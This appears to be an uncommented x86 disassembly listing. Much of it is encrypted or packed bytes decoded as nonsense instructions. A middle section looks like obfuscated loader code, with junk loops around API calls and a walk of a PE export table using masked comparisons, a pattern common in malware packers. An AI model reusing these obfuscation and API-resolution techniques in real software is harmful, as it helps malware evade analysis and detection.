  40cbd2:	add    eax,eax
  40cbd4:	nop
  40cbd5:	fidiv  WORD PTR [esi]
  40cbd7:	add    eax,ebx
  40cbd9:	push   esp
  40cbda:	fmulp  st(0),st
  40cbdc:	mov    eax,0x9c45dc17
  40cbe1:	add    esi,ebp
  40cbe3:	xor    cl,ah
  40cbe5:	jp     0x40cbb1
  40cbe7:	cli    
  40cbe8:	imul   edi,ebp,0x1c
  40cbeb:	ds inc esi
  40cbed:	and    ebx,DWORD PTR [ecx]
  40cbef:	mov    bh,0x9c
  40cbf1:	xchg   ecx,eax
  40cbf2:	inc    edx
  40cbf3:	mov    ebx,0xc63ff2f2
  40cbf8:	sbb    bl,BYTE PTR [ebx+0x1e40dc7c]
  40cbfe:	adc    BYTE PTR [eax-0x1d],bl
  40cc01:	fs push ss
  40cc03:	fist   DWORD PTR [esi-0x2f0192ce]
  40cc09:	sbb    ah,BYTE PTR ds:0xb4319c87
  40cc0f:	mov    al,0xde
  40cc11:	push   ebp
  40cc12:	nop
  40cc13:	mov    cl,0x84
  40cc15:	mov    edi,0xd1fce909
  40cc1a:	cmp    ecx,DWORD PTR [ebx+0x4cbf3415]
  40cc20:	nop
  40cc21:	pop    esi
  40cc22:	mov    edx,0xd227886f
  40cc27:	mov    ch,0x3d
  40cc29:	push   eax
  40cc2a:	pushf  
  40cc2b:	add    bl,BYTE PTR [edx]
  40cc2d:	lods   al,BYTE PTR ds:[esi]
  40cc2e:	and    ah,bl
  40cc30:	std    
  40cc31:	cwde   
  40cc32:	data16 sbb bl,bh
  40cc35:	xlat   BYTE PTR ds:[ebx]
  40cc36:	stos   DWORD PTR es:[edi],eax
  40cc37:	shl    BYTE PTR [eax+esi*2-0x32d89722],0xd1
  40cc3f:	inc    esp
  40cc40:	popf   
  40cc41:	movsx  ecx,cl
  40cc44:	ret    0xc9bd
  40cc47:	mov    edi,gs
  40cc49:	jecxz  0x40cbf4
  40cc4b:	mov    esi,0xf19d8c81
  40cc50:	loope  0x40cc45
  40cc52:	icebp  
  40cc53:	xor    ebp,DWORD PTR [ebx+0x459cbf41]
  40cc59:	sub    esp,ecx
  40cc5b:	rcr    dl,cl
  40cc5d:	fst    QWORD PTR [edx-0x63]
  40cc60:	jl     0x40cc31
  40cc62:	and    BYTE PTR [ecx-0x25],ch
  40cc65:	xor    al,0x49
  40cc67:	in     al,dx
  40cc68:	inc    eax
  40cc69:	mov    ds:0x5e008172,eax
  40cc6e:	test   DWORD PTR [ecx],eax
  40cc70:	(bad)  
  40cc71:	jp     0x40ccc7
  40cc73:	popa   
  40cc74:	cld    
  40cc75:	les    eax,FWORD PTR [ebx]
  40cc77:	popf   
  40cc78:	sub    edi,ebp
  40cc7a:	push   0x8e15c55a
  40cc7f:	ficom  DWORD PTR [eax]
  40cc81:	dec    BYTE PTR [ecx+0x160fd8c7]
  40cc87:	shr    BYTE PTR [eax],1
  40cc89:	xchg   esi,eax
  40cc8a:	adc    eax,0xce2aca96
  40cc8f:	out    dx,eax
  40cc90:	fs addr16 jae 0x40cc9f
  40cc94:	(bad)  [edx+0x7958bb4e]
  40cc9a:	enter  0x7e15,0xc1
  40cc9e:	pop    ebx
  40cc9f:	sub    bh,ah
  40cca1:	sub    edx,DWORD PTR [edi+0x103b3cc7]
  40cca7:	sub    esi,DWORD PTR [ebx]
  40cca9:	inc    eax
  40ccaa:	arpl   WORD PTR fs:[ebp-0x40fdf657],ax
  40ccb1:	and    DWORD PTR es:[eax],ecx
  40ccb4:	cdq    
  40ccb5:	cmc    
  40ccb6:	or     BYTE PTR [ecx-0x6a40c078],ah
  40ccbc:	js     0x40ccde
  40ccbe:	cmp    BYTE PTR [ecx],cl
  40ccc0:	aad    0xef
  40ccc2:	sub    DWORD PTR [ebp+0x1e7c5f1f],ecx
  40ccc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccc9:	jmp    DWORD PTR [eax+ecx*4+0x3f1cdb5]
  40ccd0:	xchg   esp,eax
  40ccd1:	retf   
  40ccd2:	cld    
  40ccd3:	pop    esp
  40ccd4:	lds    edx,FWORD PTR [edx-0x62]
  40ccd7:	sahf   
  40ccd8:	dec    esp
  40ccd9:	push   ss
  40ccda:	ss push ebx
  40ccdc:	ins    BYTE PTR es:[edi],dx
  40ccdd:	fwait
  40ccde:	(bad)  
  40ccdf:	mov    edx,0x7846bede
  40cce4:	mov    cl,BYTE PTR [edx+0x251fc990]
  40ccea:	xchg   ecx,eax
  40cceb:	sahf   
  40ccec:	xor    eax,0xed4a6a23
  40ccf1:	mov    eax,ds:0xab5e222a
  40ccf6:	mov    ebp,0x4af8f2d9
  40ccfb:	inc    ecx
  40ccfc:	js     0x40cd78
  40ccfe:	js     0x40cd10
  40cd00:	sub    DWORD PTR [eax],0x810db716
  40cd06:	and    eax,0x735f1ada
  40cd0b:	push   ecx
  40cd0c:	sbb    eax,0x40d33492
  40cd11:	mov    dl,BYTE PTR [edi+0x9]
  40cd14:	lahf   
  40cd15:	das    
  40cd16:	pop    ds
  40cd17:	in     eax,dx
  40cd18:	test   al,0x92
  40cd1a:	pop    eax
  40cd1b:	test   bl,ah
  40cd1d:	or     DWORD PTR [edx+ecx*8+0x45522175],0x40
  40cd25:	sub    al,bl
  40cd27:	push   esp
  40cd28:	ins    DWORD PTR es:[edi],dx
  40cd29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd2a:	cld    
  40cd2b:	sbb    BYTE PTR [ebx+0x48],cl
  40cd2e:	popa   
  40cd2f:	and    DWORD PTR [esi-0x4d4633fa],ebp
  40cd35:	or     BYTE PTR [edi+0x5],al
  40cd38:	cmp    al,0xfd
  40cd3a:	jle    0x40cd8f
  40cd3c:	push   ds
  40cd3d:	cwde   
  40cd3e:	loopne 0x40cd41
  40cd40:	sub    al,0x4c
  40cd42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd43:	add    DWORD PTR [edx+0x40],edi
  40cd46:	or     al,0x45
  40cd48:	test   DWORD PTR [edi],esp
  40cd4a:	das    
  40cd4b:	jmp    0x5e27593b
  40cd50:	sbb    DWORD PTR ds:0xa184d2ef,ebp
  40cd56:	jge    0x40ccde
  40cd58:	inc    esi
  40cd59:	pop    esp
  40cd5a:	mov    bh,0xa3
  40cd5c:	jl     0x40cd64
  40cd5e:	ret    0x3664
  40cd61:	retf   
  40cd62:	adc    bh,BYTE PTR [esi+0xb]
  40cd65:	(bad)  [ecx+0x4045deb2]
  40cd6b:	cmp    bl,BYTE PTR [ebx-0x5938012f]
  40cd71:	mov    bl,0xed
  40cd73:	cdq    
  40cd74:	jmp    0x40cd66
  40cd76:	mov    edx,0xabb869a0
  40cd7b:	ins    BYTE PTR es:[edi],dx
  40cd7c:	xchg   ebp,eax
  40cd7d:	dec    edi
  40cd7e:	cmp    DWORD PTR [esi-0x1],0xbec7fbd0
  40cd85:	ror    esp,1
  40cd87:	push   esp
  40cd88:	jns    0x40cd35
  40cd8a:	test   bh,bl
  40cd8c:	mov    DWORD PTR [edx],ecx
  40cd8e:	nop
  40cd8f:	sar    BYTE PTR [eax],0x9f
  40cd92:	in     al,0xa1
  40cd94:	outs   dx,BYTE PTR ds:[esi]
  40cd95:	inc    ebx
  40cd96:	ins    BYTE PTR es:[edi],dx
  40cd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd98:	sbb    esp,DWORD PTR [ecx]
  40cd9a:	bound  esp,QWORD PTR [edx+esi*2]
  40cd9d:	mul    BYTE PTR [esi]
  40cd9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cda0:	xchg   ebx,eax
  40cda1:	mov    dh,0xf6
  40cda3:	sbb    bl,dh
  40cda5:	pop    edx
  40cda6:	pop    esi
  40cda7:	mov    ah,0x21
  40cda9:	dec    edx
  40cdaa:	loope  0x40cd4f
  40cdac:	xchg   edx,esi
  40cdae:	or     ch,cl
  40cdb0:	je     0x40cd86
  40cdb2:	cmp    BYTE PTR [ebx-0x12],ch
  40cdb5:	es dec ecx
  40cdb7:	mov    cl,0xef
  40cdb9:	adc    ecx,DWORD PTR [eax]
  40cdbb:	loop   0x40ce15
  40cdbd:	jb     0x40ce32
  40cdbf:	and    BYTE PTR [edx+ebx*2],cl
  40cdc2:	stos   BYTE PTR es:[edi],al
  40cdc3:	push   edi
  40cdc4:	jecxz  0x40cd47
  40cdc6:	mov    dl,0x92
  40cdc8:	dec    ebp
  40cdc9:	repnz and eax,0x15e4b157
  40cdcf:	out    0x71,eax
  40cdd1:	xchg   esi,eax
  40cdd2:	clc    
  40cdd3:	and    al,0xdd
  40cdd5:	(bad)  
  40cdd6:	test   al,0xaf
  40cdd8:	mov    esi,0x943e3aee
  40cddd:	enter  0x693b,0xcc
  40cde1:	jns    0x40ce4f
  40cde3:	out    0x2f,eax
  40cde5:	mov    ds:0xa9f7f761,al
  40cdea:	add    eax,0x8a0ea1cc
  40cdef:	mov    ebp,0x451d8397
  40cdf4:	xor    al,0x36
  40cdf6:	cmp    al,0x41
  40cdf8:	mov    edi,0xa16d91c2
  40cdfd:	leave  
  40cdfe:	push   0xffffffbd
  40ce00:	cli    
  40ce01:	sbb    BYTE PTR [ecx+0x1703fe],0x1
  40ce08:	inc    eax
  40ce09:	sbb    eax,0xc792e62a
  40ce0e:	test   al,0x3f
  40ce10:	in     eax,0x33
  40ce12:	sbb    eax,0xb1394fc5
  40ce17:	(bad)  
  40ce18:	out    dx,al
  40ce19:	loop   0x40cdd3
  40ce1b:	(bad)  
  40ce1c:	(bad)  [ebx]
  40ce1e:	dec    esp
  40ce1f:	and    cl,BYTE PTR [esi-0x17]
  40ce22:	xchg   ebp,eax
  40ce23:	mov    ebp,0x82cdfe9
  40ce28:	jb     0x40ce18
  40ce2a:	cs push edx
  40ce2c:	jl     0x40cdfc
  40ce2e:	bound  edi,QWORD PTR [esi+0x16000ca7]
  40ce34:	div    DWORD PTR [esi+0x75ae9f59]
  40ce3a:	sbb    BYTE PTR [ecx],bl
  40ce3c:	mov    di,cx
  40ce3f:	das    
  40ce40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce41:	mov    bl,0x5f
  40ce43:	repz shr DWORD PTR [eax],0x90
  40ce47:	lahf   
  40ce48:	(bad)  
  40ce49:	pop    edi
  40ce4a:	pusha  
  40ce4b:	add    al,0xdb
  40ce4d:	fstp   DWORD PTR [esi+0x4961e658]
  40ce53:	or     al,0x2c
  40ce55:	or     esp,0xfe4fe3a
  40ce5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5c:	sbb    esp,DWORD PTR [ebx]
  40ce5e:	pop    ss
  40ce5f:	xchg   ecx,eax
  40ce60:	ins    DWORD PTR es:[edi],dx
  40ce61:	dec    ebp
  40ce62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce63:	(bad)  
  40ce65:	push   cs
  40ce66:	pushf  
  40ce67:	aad    0xa3
  40ce69:	dec    eax
  40ce6a:	iretw  
  40ce6c:	je     0x40cdf5
  40ce6e:	push   edi
  40ce6f:	or     dl,ah
  40ce71:	dec    esp
  40ce72:	out    0x24,al
  40ce74:	bound  ebx,QWORD PTR [edi+edi*1]
  40ce77:	sbb    al,0xcd
  40ce79:	aas    
  40ce7a:	aaa    
  40ce7b:	xor    eax,0x64e9dd4e
  40ce80:	inc    esi
  40ce81:	gs inc esp
  40ce83:	dec    ebx
  40ce84:	shl    DWORD PTR [edx+0x43],cl
  40ce87:	das    
  40ce88:	cmp    BYTE PTR [esi+0x5926a3c7],dl
  40ce8e:	dec    edi
  40ce8f:	int    0x7
  40ce91:	sti    
  40ce92:	pop    es
  40ce93:	mov    eax,ds:0xc61e3e53
  40ce98:	mov    ebx,0xc7fc458b
  40ce9d:	add    eax,0x428eab
  40cea2:	push   ds
  40cea3:	add    BYTE PTR [eax],al
  40cea5:	add    BYTE PTR [ebx+0x428eab3d],al
  40ceab:	add    BYTE PTR [eax],al
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9f3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9fb
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9ff
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42aa03
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42aa07
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax-0x4316eead]
  40d217:	ret    0x554a
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	and    DWORD PTR [edi],0x5b
  40d223:	jno    0x40d1ff
  40d225:	adc    bh,BYTE PTR [eax]
  40d227:	sub    eax,0x298beb00
  40d22c:	cmp    BYTE PTR [ebp+0x7e],al
  40d22f:	fldenv [edx-0x11d66b16]
  40d235:	fs mov al,0x8e
  40d238:	adc    dh,BYTE PTR [edx+0x5f47e44f]
  40d23e:	int    0x15
  40d240:	dec    ebx
  40d241:	push   0x28
  40d243:	sti    
  40d244:	shr    DWORD PTR [edi+0x6c],cl
  40d247:	mov    ds:0x1683a2f,eax
  40d24c:	mov    WORD PTR [eax+0x15],ss
  40d24f:	push   es
  40d250:	les    ecx,FWORD PTR [edx+0x38]
  40d253:	and    dl,bl
  40d255:	or     esi,DWORD PTR [ebx]
  40d257:	repnz daa 
  40d259:	xchg   edi,eax
  40d25a:	psubusb mm5,mm3
  40d25d:	cmp    eax,0x21487747
  40d262:	mov    ah,0x10
  40d264:	clc    
  40d265:	or     esp,esp
  40d267:	inc    si
  40d269:	lock mov esp,0xd5478537
  40d26f:	pop    ebx
  40d270:	mov    fs,WORD PTR fs:[esi-0x2572cae5]
  40d277:	(bad)  
  40d278:	xchg   esp,eax
  40d279:	cld    
  40d27a:	(bad)  
  40d27b:	cmp    DWORD PTR [ebp-0x7055193],edx
  40d281:	ins    DWORD PTR es:[edi],dx
  40d282:	(bad)  
  40d283:	out    0x5e,eax
  40d285:	enter  0x1d1,0x35
  40d289:	popf   
  40d28a:	xor    BYTE PTR [ecx],bh
  40d28c:	mov    ah,0x87
  40d28e:	sbb    al,0xbc
  40d290:	test   BYTE PTR [ecx-0x1b8ae086],bh
  40d296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d297:	leave  
  40d298:	pop    ss
  40d299:	in     al,0xd3
  40d29b:	mov    esi,0xc5220504
  40d2a0:	jo     0x40d23b
  40d2a2:	sub    eax,ebx
  40d2a4:	int    0x19
  40d2a6:	cmp    ecx,0x4d
  40d2a9:	cmp    eax,0xd43f6ac3
  40d2ae:	fcmovnu st,st(0)
  40d2b0:	inc    eax
  40d2b1:	fadd   DWORD PTR ds:0x155af248
  40d2b7:	mul    BYTE PTR [edi+0x14]
  40d2ba:	push   edi
  40d2bb:	call   0x574506d4
  40d2c0:	dec    edi
  40d2c1:	pop    eax
  40d2c2:	mov    esi,0x273e4611
  40d2c7:	and    BYTE PTR [eax],dh
  40d2c9:	(bad)  
  40d2ca:	test   ebp,0x9ae4135e
  40d2d0:	repz push eax
  40d2d2:	push   edx
  40d2d3:	sbb    bl,BYTE PTR [edx]
  40d2d5:	and    ebx,DWORD PTR ds:0xb7ea72c
  40d2db:	retf   
  40d2dc:	inc    edi
  40d2dd:	outs   dx,DWORD PTR ds:[esi]
  40d2de:	ret    0xe297
  40d2e1:	jns    0x40d288
  40d2e3:	es mov ebp,0xde1aa540
  40d2e9:	xchg   ebp,eax
  40d2ea:	inc    esi
  40d2eb:	mov    eax,0xd55e1afb
  40d2f0:	ror    BYTE PTR [ecx+0x25],cl
  40d2f3:	xchg   esp,eax
  40d2f4:	sbb    ch,BYTE PTR [ebp+0x4a]
  40d2f7:	inc    eax
  40d2f8:	push   esp
  40d2f9:	xor    eax,edi
  40d2fb:	daa    
  40d2fc:	test   eax,0xb1e70955
  40d301:	(bad)  
  40d302:	mov    eax,0x267229ef
  40d307:	cmp    al,0x8c
  40d309:	ret    
  40d30a:	pop    ds
  40d30b:	sub    eax,0x3c9698c3
  40d310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d311:	addr16 mov bl,0x20
  40d314:	fbstp  TBYTE PTR [edi-0x1d1abd2d]
  40d31a:	popa   
  40d31b:	bound  ecx,QWORD PTR [ecx+0x5c]
  40d31e:	ret    
  40d31f:	pop    ds
  40d320:	dec    esi
  40d321:	gs adc eax,0xca14c49a
  40d327:	mov    bh,0x41
  40d329:	fisub  WORD PTR [edi+0x211a04b7]
  40d32f:	scas   al,BYTE PTR es:[edi]
  40d330:	mov    bl,0x15
  40d332:	xchg   edx,eax
  40d333:	cmp    BYTE PTR [edi+0x3d],cl
  40d336:	(bad)  
  40d337:	mov    edi,0xcd69f363
  40d33c:	fsubr  st(4),st
  40d33e:	mov    cl,0x52
  40d340:	test   al,0xb1
  40d342:	or     al,0xd6
  40d344:	bnd jbe 0x40d327
  40d347:	add    BYTE PTR [ebx+0x2fa71eca],al
  40d34d:	cmp    BYTE PTR [esi],al
  40d34f:	add    al,0x37
  40d351:	add    ah,BYTE PTR [edi]
  40d353:	push   ecx
  40d354:	cmc    
  40d355:	rcl    BYTE PTR [eax-0x415e8bd],cl
  40d35b:	pop    ds
  40d35c:	fidivr WORD PTR [esi]
  40d35e:	aad    0xc7
  40d360:	ret    
  40d361:	inc    edi
  40d362:	(bad)  [eax]
  40d364:	mov    al,0x8c
  40d366:	dec    ebx
  40d367:	cmp    eax,0xf4edcd56
  40d36c:	leave  
  40d36d:	push   0xffffffe9
  40d36f:	inc    ebx
  40d370:	neg    DWORD PTR [ecx+0x5f]
  40d373:	(bad)
  40d376:	push   ebx
  40d377:	jbe    0x40d31a
  40d379:	pop    ebp
  40d37a:	pushf  
  40d37b:	test   al,0x1d
  40d37d:	clc    
  40d37e:	in     eax,dx
  40d37f:	pop    es
  40d380:	fisubr DWORD PTR [edi+ebp*1]
  40d383:	mov    ds:0x197c2fe1,eax
  40d388:	and    al,0x4
  40d38a:	call   FWORD PTR [ecx+ecx*2-0x67]
  40d38e:	fisttp DWORD PTR [ebx]
  40d390:	or     eax,0x73778589
  40d395:	mov    WORD PTR [esi],?
  40d397:	pushf  
  40d398:	fwait
  40d399:	jo     0x40d372
  40d39b:	into   
  40d39c:	call   0x5a6b28d1
  40d3a1:	inc    ecx
  40d3a2:	cwde   
  40d3a3:	jle    0x40d38f
  40d3a5:	or     al,BYTE PTR [edi]
  40d3a7:	mov    ah,0xaa
  40d3a9:	fsub   QWORD PTR [edx]
  40d3ab:	mov    eax,0x33041ed9
  40d3b0:	neg    ebx
  40d3b2:	mov    ds:0xa064aae7,al
  40d3b7:	dec    edx
  40d3b8:	and    BYTE PTR [eax],al
  40d3ba:	pop    esp
  40d3bb:	xor    WORD PTR [ebp+0x58],sp
  40d3bf:	and    al,0x52
  40d3c1:	in     al,dx
  40d3c2:	cmc    
  40d3c3:	mov    ds:0xf81dab17,eax
  40d3c8:	es aaa 
  40d3ca:	sub    al,0x19
  40d3cc:	ins    DWORD PTR es:[edi],dx
  40d3cd:	out    0xda,eax
  40d3cf:	mov    dh,0x71
  40d3d1:	inc    eax
  40d3d2:	stos   DWORD PTR es:[edi],eax
  40d3d3:	lock jmp 0x9166:0x7183b869
  40d3db:	sbb    edx,DWORD PTR [esi-0x7bfae4ba]
  40d3e1:	adc    al,0x4
  40d3e3:	xchg   esi,eax
  40d3e4:	and    al,0x6e
  40d3e6:	sbb    eax,edi
  40d3e8:	add    esp,DWORD PTR ds:0x277e2180
  40d3ee:	mov    ebx,ebp
  40d3f0:	mov    esi,0x7ed7e879
  40d3f5:	idiv   BYTE PTR [eax+ebp*8-0x5cce258c]
  40d3fc:	ret    0x50f7
  40d3ff:	xor    ebx,ecx
  40d401:	sbb    eax,DWORD PTR ds:0x25820089
  40d407:	adc    BYTE PTR [edi+0x63],0x12
  40d40b:	addr16 jl 0x40d391
  40d40e:	push   edi
  40d40f:	pop    esi
  40d410:	cmp    dl,BYTE PTR [ebx]
  40d412:	inc    ecx
  40d413:	mov    bl,0x8f
  40d415:	push   esp
  40d416:	dec    esp
  40d417:	daa    
  40d418:	clc    
  40d419:	xchg   esp,eax
  40d41a:	leave  
  40d41b:	pop    esp
  40d41c:	cli    
  40d41d:	push   esp
  40d41e:	mov    bh,0x6d
  40d420:	das    
  40d421:	adc    ebp,DWORD PTR [ecx-0x5b707d49]
  40d427:	loope  0x40d3fd
  40d429:	cmp    BYTE PTR [edx],dl
  40d42b:	jmp    0x40d430
  40d42d:	fs add al,0xa0
  40d430:	mov    ch,0x29
  40d432:	xchg   ebx,eax
  40d433:	or     DWORD PTR [eax+esi*2],ebp
  40d436:	jge    0x40d487
  40d438:	sub    DWORD PTR [ebp+0x79],0xffffffe8
  40d43c:	lahf   
  40d43d:	sub    al,0x80
  40d43f:	stc    
  40d440:	xchg   BYTE PTR [esi-0x5],cl
  40d443:	(bad)  
  40d444:	popa   
  40d445:	mov    al,ds:0xfe96da38
  40d44a:	sub    BYTE PTR [edx-0x5bd5500f],bh
  40d450:	jmp    0x40d471
  40d452:	jl     0x40d469
  40d454:	(bad)  
  40d455:	arpl   WORD PTR [ebx],di
  40d457:	dec    ebp
  40d458:	and    eax,0xfeeed48f
  40d45d:	mov    al,0x89
  40d45f:	jmp    0x40d3f0
  40d461:	and    BYTE PTR [esi+0x7],cl
  40d464:	icebp  
  40d465:	dec    ecx
  40d466:	jno    0x40d4e6
  40d468:	cmp    DWORD PTR [edx-0x6a],ecx
  40d46b:	nop
  40d46c:	add    eax,0x92583ebe
